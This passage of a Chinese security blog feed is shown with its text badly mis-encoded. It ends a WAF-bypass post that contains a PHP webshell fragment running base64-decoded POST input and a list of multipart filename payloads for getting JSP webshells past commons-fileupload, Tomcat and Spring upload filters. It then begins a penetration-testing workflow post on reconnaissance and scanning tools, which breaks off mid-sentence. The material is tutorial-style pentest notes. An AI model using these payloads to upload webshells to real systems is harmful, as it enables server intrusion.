class="variable">$cmd</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>èšå‰‘</p><p>ç¼–ç å™¨</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data[pwd] = Buffer.<span class="keyword">from</span>(data[<span class="string">&#x27;_&#x27;</span>]).<span class="title function_ invoke__">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br></pre></td></tr></table></figure><p>é€‰æ‹©ç¼–ç å™¨</p><p><img src="/../images/image-20230517211627163.png" alt="image-20230517211627163"></p><h1 id="JAVAæ–‡ä»¶ä¸Šä¼ ç»•è¿‡è¡¥å……"><a href="#JAVAæ–‡ä»¶ä¸Šä¼ ç»•è¿‡è¡¥å……" class="headerlink" title="JAVAæ–‡ä»¶ä¸Šä¼ ç»•è¿‡è¡¥å……"></a>JAVAæ–‡ä»¶ä¸Šä¼ ç»•è¿‡è¡¥å……</h1><h2 id="commons-fileuploadç»„ä»¶â€“QPç¼–ç "><a href="#commons-fileuploadç»„ä»¶â€“QPç¼–ç " class="headerlink" title="commons-fileuploadç»„ä»¶â€“QPç¼–ç "></a>commons-fileuploadç»„ä»¶â€“QPç¼–ç </h2><p>org.apache.commons.fileuploadå¯¹ä¼ å…¥çš„å€¼è¿›è¡Œäº†<code>MimeUtility.decodeText</code>æ“ä½œ</p><p>ä¸ºäº†ç¬¦åˆ<a href="https://www.rfc-editor.org/rfc/rfc2047">RFC 2047</a>è§„èŒƒä¼šå°†</p><ol><li>è¦æ±‚ä»¥<code>=?</code>å¼€å¤´</li><li>ä¹‹åè¦æ±‚è¿˜è¦æœ‰ä¸€ä¸ª<code>?</code>ï¼Œä¸­é—´çš„å†…å®¹ä¸ºç¼–ç ï¼Œä¹Ÿå°±æ˜¯<code>=?charset?</code></li><li>è·å–ä¸‹ä¸€ä¸ª<code>?</code>é—´çš„å†…å®¹ï¼Œè¿™é‡Œä¸ä¸‹é¢çš„ç¼–è§£ç æœ‰å…³</li><li>ä¹‹åå®šä½åˆ°æœ€åä¸€ä¸ª<code>?=</code>é—´å†…å®¹æ‰§è¡Œè§£ç </li></ol><p>ä¾‹å­</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">=?gbk?Q?=31=2e=6a=73=70?=</span><br></pre></td></tr></table></figure><p><code>B</code>ï¼Œ<code>Q</code>ï¼Œåˆ†åˆ«å¯¹åº”<code>Base64</code>ä»¥åŠ<code>Quoted-printable</code>ç¼–ç </p><blockquote><p>Quoted-printableå°†ä»»ä½•8-bitå­—èŠ‚å€¼å¯ç¼–ç ä¸º3ä¸ªå­—ç¬¦ï¼šä¸€ä¸ªç­‰å·â€&#x3D;â€åè·Ÿéšä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—(0â€“9æˆ–Aâ€“F)è¡¨ç¤ºè¯¥å­—èŠ‚çš„æ•°å€¼ã€‚ä¾‹å¦‚ï¼ŒASCIIç æ¢é¡µç¬¦ï¼ˆåè¿›åˆ¶å€¼ä¸º12ï¼‰å¯ä»¥è¡¨ç¤ºä¸ºâ€&#x3D;0Câ€ï¼Œ ç­‰å·â€&#x3D;â€ï¼ˆåè¿›åˆ¶å€¼ä¸º61ï¼‰å¿…é¡»è¡¨ç¤ºä¸ºâ€&#x3D;3Dâ€ï¼Œgb2312ä¸‹â€œä¸­â€è¡¨ç¤ºä¸º&#x3D;D6&#x3D;D0</p></blockquote><p>Payload</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">boundary==?gbk?Q?=2d=2d=2d=2d=57=65=62=4b=69=74=46=6f=72=6d=42=6f=75=6e=64=61=72=79=54=79=42=44=6f=4b=76=61=6d=4e=35=38=6c=63=45=77?=</span><br><span class="line"></span><br><span class="line">è§£ç å</span><br><span class="line">boundary=----WebKitFormBoundaryTyBDoKvamN58lcEw</span><br></pre></td></tr></table></figure><p><img src="/../images/14.png" alt="img"></p><p>è§£ç æ—¶åªä¼šæå–<code>=??=</code>ä¹‹é—´çš„å†…å®¹ï¼Œæ‰€ä»¥å¯ä»¥åœ¨æœ€åæ’å…¥æ··æ·†å­—ç¬¦</p><p><img src="/../images/16.png" alt="img"></p><p>å¤„ç†è¿‡ç¨‹ä¸­è¿˜æœ‰å¯¹<code> \t\r\n</code>çš„å¤„ç†</p><p>å¯ä»¥å°†æ–‡ä»¶åæ‹†åˆ†å¹¶æ’å…¥\t\r\n</p><p><img src="/../images/18.png" alt="img"></p><h2 id="Tomcatä¸Springæ–‡ä»¶ä¸Šä¼ "><a href="#Tomcatä¸Springæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="Tomcatä¸Springæ–‡ä»¶ä¸Šä¼ "></a>Tomcatä¸Springæ–‡ä»¶ä¸Šä¼ </h2><p>å¦‚æœé¦–ä½æ˜¯<code>&quot;</code>(å‰ææ¡ä»¶æ˜¯é‡Œé¢æœ‰<code>\</code>å­—ç¬¦)ï¼Œé‚£ä¹ˆå°±ä¼šå»æ‰<code>&quot;</code>ï¼Œä»ç¬¬äºŒä¸ªå­—ç¬¦å¼€å§‹å–å€¼ï¼Œå¹¶ä¸”æœ«å°¾ä¹Ÿä¼šå¾€å‰ç§»åŠ¨ä¸€ä½ï¼ŒåŒæ—¶ä¼šå¿½ç•¥å­—ç¬¦<code>\</code></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">filename=&quot;y4\.jspZ</span><br><span class="line">filename=&quot;1.txt\&quot;.jsp&quot;</span><br></pre></td></tr></table></figure><p><img src="/../images/10.png" alt="img"></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data*;;;;;;;;;;name*=&quot;UTF-16BE&#x27;Y4tacker&#x27;%00d%00e%00p%00l%00o%00y%00W%00a%00r&quot;;;;;;;;;filename*=&quot;UTF-16BE&#x27;Y4tacker&#x27;%00%22%00y%00%5C%004%00.%00%5C%00w%00%5C%00a%00r%00K&quot;</span><br><span class="line"></span><br><span class="line"># Spring5æ”¯æŒçš„ç¼–ç UTF-8/ISO-8859-1/US_ASCII</span><br><span class="line">filename*=utf8&#x27;das&#x27;1.jsp</span><br><span class="line">filename*=utf8&quot;das&quot;1.jsp</span><br><span class="line">filename*=utf8&quot;das&quot;1.jsp;sd=1</span><br><span class="line">filename*=&quot;utf8&#x27;das&#x27;1.jsp&quot;</span><br><span class="line">filename*=&quot;utf8&#x27;das&#x27;1.jsp&quot;;;;;asdsad;</span><br><span class="line"># å†åŠ urlç¼–ç </span><br><span class="line">filename*=utf8&quot;das&quot;1.js%70;sd=1</span><br><span class="line"></span><br><span class="line">filename=1.jsp;.txt;</span><br><span class="line">filename=&quot;1.txt&quot;.jsp;txt;</span><br><span class="line"></span><br><span class="line"># å¤šä¸ªfilenameç»„åˆç»•è¿‡</span><br><span class="line">filename=&quot;1.txt&quot;;filename*=&quot;UTF-8&quot;&#x27;sad&#x27;%32%2e%6a%73%70 #%32%2e%6a%73%70â†’2.jsp</span><br><span class="line">z=&quot;filename=&quot;1.jsp&quot;&quot;;filename=&quot;1.txt&quot;</span><br><span class="line">z=&quot;filename=1.jsp;&quot;;filename=&quot;1.txt&quot;</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://xz.aliyun.com/t/12684">https://xz.aliyun.com/t/12684</a></p><p><a href="https://xz.aliyun.com/t/368">æˆ‘çš„WafBypassä¹‹é“ï¼ˆSQLæ³¨å…¥ç¯‡ï¼‰ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://xz.aliyun.com/t/10515">æ–‡ä»¶ä¸Šä¼ ç»•è¿‡æ€è·¯æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>[Bypass WAF Cookbook - MayIKissYou (wooyun.js.org)](<a href="https://wooyun.js.org/drops/Bypass">https://wooyun.js.org/drops/Bypass</a> WAF Cookbook.html)</p><p><a href="https://www.anquanke.com/post/id/203880">WAFæ˜¯å¦‚ä½•è¢«ç»•è¿‡çš„ï¼Ÿ-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p><a href="https://xz.aliyun.com/t/11607#toc-1">ç„æ­¦ç›¾çš„å‡ ç§ç»•è¿‡å§¿åŠ¿ - å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://y4tacker.github.io/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/">Javaæ–‡ä»¶ä¸Šä¼ å¤§æ€å™¨-ç»•waf(é’ˆå¯¹commons-fileuploadç»„ä»¶) | Y4tackerâ€™s Blog</a></p><p><a href="https://y4tacker.github.io/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/#Spring5">æ¢å¯»Tomcatæ–‡ä»¶ä¸Šä¼ æµé‡å±‚é¢ç»•wafæ–°å§¿åŠ¿ | Y4tackerâ€™s Blog</a></p><p><a href="https://y4tacker.github.io/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/#%E7%81%B5%E6%B4%BB%E7%9A%84parseQuotedToken">æ¢å¯»Javaæ–‡ä»¶ä¸Šä¼ æµé‡å±‚é¢wafç»•è¿‡å§¿åŠ¿ç³»åˆ—äºŒ | Y4tackerâ€™s Blog</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ¸—é€æµ‹è¯•æµç¨‹</title>
      <link href="/2023/06/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"/>
      <url>/2023/06/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="æ€»ä½“æµç¨‹"><a href="#æ€»ä½“æµç¨‹" class="headerlink" title="æ€»ä½“æµç¨‹"></a>æ€»ä½“æµç¨‹</h1><p><img src="/../images/1550719703_5c6e1ad700bb6-1685533751883.png!small" alt="å›¾ç‰‡.png"></p><p>â€‹<a href="https://www.freebuf.com/column/196291.html">æ¸—é€æµ‹è¯•çš„8ä¸ªæ­¥éª¤ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ˜ç¡®ç›®æ ‡ï¼šä¸å®¢æˆ·äº¤æµï¼Œå¾—åˆ°æ¸—é€çš„èŒƒå›´ï¼Œè§„åˆ™å’Œéœ€æ±‚</span><br><span class="line">ä¿¡æ¯æ”¶é›†ï¼šèµ„äº§æ”¶é›†+æ•æ„Ÿä¿¡æ¯æ”¶é›†+æŒ‡çº¹è¯†åˆ«</span><br><span class="line">æ¼æ´æ¢æµ‹å’Œä¿¡æ¯åˆ†æï¼šæ¼æ´æ¢æµ‹ä¸åˆ©ç”¨</span><br><span class="line">è·å–æ‰€éœ€ï¼šåæ¸—é€</span><br><span class="line">ä¿¡æ¯æ•´ç†å’Œå½¢æˆæŠ¥å‘Šï¼šäº§å‡ºæŠ¥å‘Š</span><br></pre></td></tr></table></figure><h1 id="å¤–ç½‘ç®€åŒ–æµç¨‹"><a href="#å¤–ç½‘ç®€åŒ–æµç¨‹" class="headerlink" title="å¤–ç½‘ç®€åŒ–æµç¨‹"></a>å¤–ç½‘ç®€åŒ–æµç¨‹</h1><blockquote><p>ç†æƒ³æ— wafæƒ…å†µï¼Œæœ‰wafå°±è¦å°½å¯èƒ½åœ°å‡å°‘ä¸»åŠ¨è¡Œä¸ºï¼ˆè¢«åŠ¨ä¿¡æ¯æ”¶é›†ï¼Œä¸æ‰«æ&#x2F;æ…¢é€Ÿæ‰«æï¼‰</p></blockquote><ul><li><p>å…¬å¸åˆ°åŸŸåï¼šenscanï¼Œicp-domains</p></li><li><p>å­åŸŸåæ”¶é›†ï¼šoneforallï¼ˆå­åŸŸåçˆ†ç ´è€—æ—¶ï¼ŒæŸäº›æƒ…å†µä¸‹å¯ä»¥é€‰æ‹©ä¸ä½¿ç”¨ï¼‰+ å…¶ä»–æœç´¢å¼•æ“ï¼ˆä¸åŒçš„è¯­æ³•ï¼‰+çˆ¬è™«</p></li><li><p>IP</p><ul><li><p>CDNè¯†åˆ«ï¼šFCDN</p></li><li><p>åŸŸåâ†’IPâ†’Cæ®µï¼šCIPR </p></li><li><p>å…¨ç«¯å£æ‰«æï¼šNmapï¼Œmaascanï¼ŒGoby</p></li></ul></li><li><p>URL&#x3D;å­åŸŸåæ”¶é›†+ç«¯å£æ‹¼æ¥</p><ul><li><p>éªŒæ´»ï¼šhttpx</p></li><li><p>æŒ‡çº¹è¯†åˆ«ï¼šEholeï¼ˆchunsouçš„æŒ‡çº¹ï¼‰</p></li></ul></li><li><p>æ¼æ´æ‰«æï¼šAWVSï¼ŒXPOCï¼ŒAfrogï¼Œnuclei</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nuclei.exe -l urls.txt -severity high,critical</span><br><span class="line">afrog.exe -T ../urls.txt -S medium, high, critical</span><br></pre></td></tr></table></figure></li><li><p>ç›®å½•æ‰«æï¼šdirsearch</p></li><li><p>æ•æ„Ÿä¿¡æ¯æ”¶é›†ï¼šæ¥å£ï¼Œjsæ–‡ä»¶ä»¥åŠå„ç§å…¬å¼€ä¿¡æ¯ä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼Œç¤¾å·¥ï¼Œä¾›åº”å•†</p></li><li><p>æµ‹è¯•</p><blockquote><p>å¯é€‰è¢«åŠ¨æ‰«æï¼šXrayï¼ŒRouteVulScanï¼ˆBurpé€’å½’ç›®å½•æ‰«æï¼‰</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nday</span><br><span class="line">å¼±å£ä»¤</span><br><span class="line">æœªæˆæƒè®¿é—®</span><br><span class="line">é€»è¾‘æ¼æ´</span><br><span class="line">å¸¸è§webæ¼æ´</span><br><span class="line">æ¥å£æµ‹è¯•</span><br><span class="line">ä»£ç å®¡è®¡</span><br><span class="line">å°ç¨‹åº</span><br><span class="line">app</span><br></pre></td></tr></table></figure></li></ul><h1 id="èµ„äº§æ”¶é›†"><a href="#èµ„äº§æ”¶é›†" class="headerlink" title="èµ„äº§æ”¶é›†"></a>èµ„äº§æ”¶é›†</h1><h2 id="ä¸ºä»€ä¹ˆ"><a href="#ä¸ºä»€ä¹ˆ" class="headerlink" title="ä¸ºä»€ä¹ˆ"></a>ä¸ºä»€ä¹ˆ</h2><p><strong>å°½å¯èƒ½çš„æ‰©å¤§æ”»å‡»é¢</strong></p><h2 id="ä¸»åŸŸåæ”¶é›†"><a href="#ä¸»åŸŸåæ”¶é›†" class="headerlink" title="ä¸»åŸŸåæ”¶é›†"></a>ä¸»åŸŸåæ”¶é›†</h2><h3 id="ICPå¤‡æ¡ˆæŸ¥è¯¢"><a href="#ICPå¤‡æ¡ˆæŸ¥è¯¢" class="headerlink" title="ICPå¤‡æ¡ˆæŸ¥è¯¢"></a>ICPå¤‡æ¡ˆæŸ¥è¯¢</h3><ul><li><p>æ˜¯ä»€ä¹ˆ</p><p>ICPå¤‡æ¡ˆæ˜¯æŒ‡ç½‘ç«™åœ¨ä¿¡æ¯äº§ä¸šéƒ¨æäº¤ç½‘ç«™ä¿¡æ¯è¿›è¡Œå®˜æ–¹è®¤å¯ã€‚</p><p>æ‰€ä»¥å›½å†…ä½¿ç”¨å›½å†…æœåŠ¡å™¨çš„ç½‘ç«™ï¼Œéƒ½å¿…é¡»è¦å…ˆåŠç†ICPå¤‡æ¡ˆåæ‰å¯ä»¥ä¸Šçº¿ã€‚</p></li><li><p>æœ‰ä»€ä¹ˆç”¨</p><p>é€šè¿‡æŸ¥è¯¢ç›®æ ‡ä¼ä¸šçš„å¤‡æ¡ˆä¿¡æ¯ï¼Œå¯ç›´æ¥è·å–åˆ°ç›®æ ‡ä¼ä¸šæ³¨å†Œäº†å“ªäº›åŸŸåï¼Œä»è€Œå¢åŠ å¯æ¸—é€çš„ç›®æ ‡èŒƒå›´ã€‚</p></li><li><p>åœ¨çº¿æŸ¥è¯¢</p><p><a href="https://beian.miit.gov.cn/#/Integrated/recordQuery">ICP&#x2F;IPåœ°å€&#x2F;åŸŸåä¿¡æ¯å¤‡æ¡ˆç®¡ç†ç³»ç»Ÿ</a></p><p><a href="https://www.qcc.com/">ä¼æŸ¥æŸ¥ </a></p><p><a href="https://www.tianyancha.com/">å¤©çœ¼æŸ¥</a></p></li><li><p>å·¥å…·</p><p><a href="https://github.com/1in9e/icp-domains">1in9e&#x2F;icp-domains: è¾“å…¥ä¸€ä¸ªåŸŸåï¼Œè¾“å‡ºICPå¤‡æ¡ˆæ‰€æœ‰å…³è”åŸŸå</a></p></li></ul><h3 id="WhoIs"><a href="#WhoIs" class="headerlink" title="WhoIs"></a>WhoIs</h3><ul><li><p>æ˜¯ä»€ä¹ˆ</p><p><code>WHOIS</code>æ˜¯ç”¨æ¥æŸ¥è¯¢äº’è”ç½‘ä¸­åŸŸåçš„IPä»¥åŠæ‰€æœ‰è€…ç­‰ä¿¡æ¯çš„ä¼ è¾“åè®®ã€‚</p></li><li><p>æœ‰ä»€ä¹ˆç”¨</p><p>é€šè¿‡æŸ¥è¯¢ç›®æ ‡çš„WHOISä¿¡æ¯ï¼Œå¯ä»¥å¯¹è”ç³»äººã€è”ç³»é‚®ç®±ç­‰ä¿¡æ¯è¿›è¡ŒåæŸ¥ï¼Œå¯ä»¥è·å–æ›´å¤šç›¸å…³çš„åŸŸåä¿¡æ¯ã€‚</p></li><li><p>åœ¨çº¿æŸ¥è¯¢</p><p><a href="https://whois.chinaz.com/">åŸŸåWhoisæŸ¥è¯¢ - ç«™é•¿ä¹‹å®¶</a></p></li></ul><h3 id="è‚¡æƒä¿¡æ¯"><a href="#è‚¡æƒä¿¡æ¯" class="headerlink" title="è‚¡æƒä¿¡æ¯"></a>è‚¡æƒä¿¡æ¯</h3><ul><li><p>æ˜¯ä»€ä¹ˆï¼Œæœ‰ä»€ä¹ˆç”¨</p><p>é€šè¿‡æŸ¥è¯¢è‚¡æƒä¿¡æ¯ï¼Œæˆ–è€…è‚¡æƒç©¿é€å›¾ï¼Œå¯»æ‰¾å­å…¬å¸å’Œå­™å…¬å¸ç­‰ï¼Œä¸€èˆ¬å¯¹å¤–æŠ•èµ„è¶…è¿‡50%æˆ–è€…æœ‰è¡Œæ”¿æƒé™çš„éƒ½å¯ä»¥ç®—ç›®æ ‡</p></li><li><p>æŸ¥è¯¢ç½‘ç«™</p><p><a href="https://www.qcc.com/">ä¼æŸ¥æŸ¥ </a></p><p><a href="https://www.tianyancha.com/">å¤©çœ¼æŸ¥</a></p></li></ul><h3 id="å…¶ä»–åº”ç”¨ä¸­çš„åŸŸå-x2F-IP"><a href="#å…¶ä»–åº”ç”¨ä¸­çš„åŸŸå-x2F-IP" class="headerlink" title="å…¶ä»–åº”ç”¨ä¸­çš„åŸŸå&#x2F;IP"></a>å…¶ä»–åº”ç”¨ä¸­çš„åŸŸå&#x2F;IP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¾®ä¿¡/æ”¯ä»˜å®å°ç¨‹åº</span><br><span class="line">å¾®ä¿¡å…¬ä¼—å·</span><br><span class="line">æ‰‹æœºAPPï¼šæŠ“åŒ…ï¼Œå†å²ç‰ˆæœ¬</span><br></pre></td></tr></table></figure><h3 id="DNSå…±äº«è®°å½•æŸ¥è¯¢"><a href="#DNSå…±äº«è®°å½•æŸ¥è¯¢" class="headerlink" title="DNSå…±äº«è®°å½•æŸ¥è¯¢"></a>DNSå…±äº«è®°å½•æŸ¥è¯¢</h3><ul><li><p>åŸç†</p><p>æŸ¥è¯¢å…±äº«DNSæœåŠ¡å™¨çš„ä¸»æœºæ¥è·å–åˆ°ç›¸å…³çš„åŸŸå</p></li><li><p>æ­¥éª¤</p><ol><li><p>é¦–å…ˆæŸ¥è¯¢ç›®æ ‡æ˜¯å¦å­˜åœ¨è‡ªå»ºçš„NSæœåŠ¡å™¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup -query=ns baidu.com</span><br></pre></td></tr></table></figure></li><li><p>å°†éæƒå¨åº”ç­”ä¸­çš„nsæœåŠ¡å™¨å¸¦åˆ°ä¸‹é¢çš„ç½‘ç«™æŸ¥è¯¢</p><p><a href="https://hackertarget.com/find-shared-dns-servers/">Find all Hosts pointing to DNS Server</a></p></li></ol></li></ul><h3 id="èšåˆå·¥å…·"><a href="#èšåˆå·¥å…·" class="headerlink" title="èšåˆå·¥å…·"></a>èšåˆå·¥å…·</h3><p><a href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a></p><blockquote><p>ä¸€æ¬¾åŸºäºå„å¤§ä¼ä¸šä¿¡æ¯APIçš„å·¥å…·ï¼Œè§£å†³åœ¨é‡åˆ°çš„å„ç§é’ˆå¯¹å›½å†…ä¼ä¸šä¿¡æ¯æ”¶é›†éš¾é¢˜ã€‚ä¸€é”®æ”¶é›†æ§è‚¡å…¬å¸ICPå¤‡æ¡ˆã€APPã€å°ç¨‹åºã€å¾®ä¿¡å…¬ä¼—å·ç­‰ä¿¡æ¯èšåˆå¯¼å‡ºã€‚</p></blockquote><p><img src="/../images/ENScanGo-1685533751887.png" alt="ENScanGo"></p><h2 id="å­åŸŸåæ”¶é›†"><a href="#å­åŸŸåæ”¶é›†" class="headerlink" title="å­åŸŸåæ”¶é›†"></a>å­åŸŸåæ”¶é›†</h2><h3 id="æšä¸¾çˆ†ç ´"><a href="#æšä¸¾çˆ†ç ´" class="headerlink" title="æšä¸¾çˆ†ç ´"></a>æšä¸¾çˆ†ç ´</h3><ul><li><p>åŸç†</p><p>é€šè¿‡ä¸æ–­çš„æ‹¼æ¥å­—å…¸ä¸­çš„å­åŸŸåå‰ç¼€å»æšä¸¾åŸŸåçš„Aè®°å½•ï¼Œå†å¯¹å…¶è¿›è¡ŒéªŒè¯ï¼Œä½†æ˜¯è¯¥æ–¹æ³•ä¸€èˆ¬éœ€è¦è§£å†³æ³›è§£æé—®é¢˜ã€‚</p></li><li><p>æ³›è§£æ</p><p>Aè®°å½•ï¼š*.khaz.top â†’ 1.1.1.1 ï¼ˆè¿™æ ·xxx.khaz.topåŸŸååœ¨è¿›è¡Œdnsè§£ææ—¶éƒ½ä¼šæŒ‡å‘1.1.1.1ï¼‰</p><p>å¦‚ä½•è§£å†³æ³›è§£æï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é»‘åå•IPæ³•</span></span><br><span class="line">é€šè¿‡è·å–ä¸€ä¸ªä¸å­˜åœ¨çš„å­åŸŸåç›¸åº”è§£æIPï¼Œæ¥è®°å½•æ ‡è®°é»‘åå•ipï¼Œå†çˆ†ç ´å­—å…¸æ—¶ï¼Œè§£æåˆ°çš„IPåœ¨è¿™ä¸ªé»‘åå•ipä¸­ï¼Œåˆ™è·³è¿‡ï¼Œä¸å­˜åœ¨å°±ç»§ç»­å¤„ç†ã€‚</span><br><span class="line"><span class="comment"># TTL</span></span><br><span class="line">åœ¨æƒå¨ DNS ä¸­ï¼Œæ³›è§£æè®°å½•çš„ TTL è‚¯å®šæ˜¯ç›¸åŒçš„ï¼Œå¦‚æœå­åŸŸåè®°å½•ç›¸åŒï¼Œä½† TTL ä¸åŒï¼Œé‚£è¿™æ¡è®°å½•å¯ä»¥è¯´è‚¯å®šä¸æ˜¯æ³›è§£æè®°å½•ã€‚</span><br></pre></td></tr></table></figure><blockquote><p>ä»¥oneforallä¸ºä¾‹ï¼š</p><p>oneforallä¼šé¦–å…ˆè®¿é—®ä¸€ä¸ªéšæœºçš„å¹¶ä¸å­˜åœ¨çš„åŸŸï¼Œé€šè¿‡è¿”å›ç»“æœåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³›è§£æï¼Œç¡®å®šå­˜åœ¨æ³›è§£æä»¥åï¼Œç¨‹åºä¼šå¼€å§‹ä¸æ–­çš„å¾ªç¯äº§ç”ŸéšæœºåŸŸåï¼Œå»å‘æœåŠ¡å™¨æŸ¥è¯¢ï¼Œå°†æ¯æ¬¡æŸ¥è¯¢åˆ°çš„IPå’ŒTTLè®°å½•ä¸‹æ¥ï¼Œç›´åˆ°å¤§éƒ¨åˆ†çš„IPåœ°å€å‡ºç°æ¬¡æ•°éƒ½å¤§äºä¸¤æ¬¡ï¼Œåˆ™IPé»‘åå•çš„æ”¶é›†ç»“æŸï¼Œåœ¨å¾—åˆ°äº†IPé»‘åå•ä»¥åï¼Œoneforallæ¥ä¸‹æ¥ä¼šå°†è‡ªå·±çš„å­—å…¸ä¸­çš„æ¯ä¸€é¡¹å’Œè¦æŒ‡å®šæŸ¥è¯¢çš„åŸŸåè¿›è¡Œæ‹¼æ¥ã€‚åœ¨çˆ†ç ´è¿‡ç¨‹ä¸­æ ¹æ®IPé»‘åå•è¿›è¡Œè¿‡æ»¤ã€‚ä½†è¿™ç§å®½æ³›çš„è¿‡æ»¤å®¹æ˜“å¯¼è‡´æ¼æŠ¥ï¼Œæ‰€ä»¥oneforallå°† TTL ä¹Ÿä½œä¸ºé»‘åå•è§„åˆ™çš„ä¸€éƒ¨åˆ†ï¼Œè¯„åˆ¤çš„ä¾æ®æ˜¯ï¼šåœ¨æƒå¨ DNS ä¸­ï¼Œæ³›è§£æè®°å½•çš„ TTL è‚¯å®šæ˜¯ç›¸åŒçš„ï¼Œå¦‚æœå­åŸŸåè®°å½•ç›¸åŒï¼Œä½† TTL ä¸åŒï¼Œé‚£è¿™æ¡è®°å½•å¯ä»¥è¯´è‚¯å®šä¸æ˜¯æ³›è§£æè®°å½•ã€‚</p></blockquote></li></ul><h3 id="è¯ä¹¦é€æ˜åº¦"><a href="#è¯ä¹¦é€æ˜åº¦" class="headerlink" title="è¯ä¹¦é€æ˜åº¦"></a>è¯ä¹¦é€æ˜åº¦</h3><ul><li><p>æ˜¯ä»€ä¹ˆ</p><p>è¯ä¹¦é€æ˜æ€§ï¼ˆCertificate Transparencyï¼ŒCTï¼‰æ˜¯ Google çš„å…¬å¼€é¡¹ç›®ï¼Œé€šè¿‡è®©åŸŸæ‰€æœ‰è€…ã€CA å’ŒåŸŸç”¨æˆ·å¯¹ SSL è¯ä¹¦çš„å‘è¡Œå’Œå­˜åœ¨è¿›è¡Œå®¡æŸ¥ï¼Œæ¥çº æ­£è¿™äº›åŸºäºè¯ä¹¦çš„å¨èƒã€‚</p></li><li><p>æœ‰ä»€ä¹ˆç”¨</p><p>å› ä¸ºæ˜¯å…¬å¼€çš„ï¼Œæ‰€ä»¥ä»»ä½•äººéƒ½å¯ä»¥è®¿é—®åˆ°å…¶ä¸­çš„CA è¯ä¹¦ï¼ŒåŒ…å«äº†åŸŸåã€å­åŸŸåã€é‚®ç®±ç­‰æ•æ„Ÿä¿¡æ¯ã€‚</p></li><li><p>åœ¨çº¿æŸ¥è¯¢</p><p><a href="https://crt.sh/">crt.sh | Certificate Search</a></p><p><a href="https://search.censys.io/">Censys Search</a></p></li></ul><h3 id="DNSå…¬å¼€æ•°æ®é›†"><a href="#DNSå…¬å¼€æ•°æ®é›†" class="headerlink" title="DNSå…¬å¼€æ•°æ®é›†"></a>DNSå…¬å¼€æ•°æ®é›†</h3><p>åˆ©ç”¨å·²æœ‰å…¬å¼€çš„æ‰«ææ•°æ®é›†ï¼Œå¯¹å­åŸŸåä¿¡æ¯è¿›è¡Œæ”¶é›†ã€‚</p><p><a href="https://opendata.rapid7.com/">https://opendata.rapid7.com/</a></p><h3 id="DNS-åŸŸä¼ é€"><a href="#DNS-åŸŸä¼ é€" class="headerlink" title="DNS åŸŸä¼ é€"></a>DNS åŸŸä¼ é€</h3><ul><li><p>æ˜¯ä»€ä¹ˆ</p><p>DNSæœåŠ¡å™¨åˆ†ä¸ºä¸»æœåŠ¡å™¨ï¼Œå¤‡ä»½æœåŠ¡å™¨ï¼Œç¼“å­˜æœåŠ¡å™¨ã€‚</p><p><strong>åŸŸä¼ é€</strong>æ˜¯æŒ‡å¤‡ä»½æœåŠ¡å™¨ä»ä¸»æœåŠ¡å™¨ä¸Šå¤åˆ¶æ•°æ®ï¼Œç„¶åæ›´æ–°è‡ªèº«çš„æ•°æ®åº“ï¼Œä»¥è¾¾åˆ°æ•°æ®åŒæ­¥çš„ç›®çš„ï¼Œè¿™æ ·æ˜¯ä¸ºäº†å¢åŠ 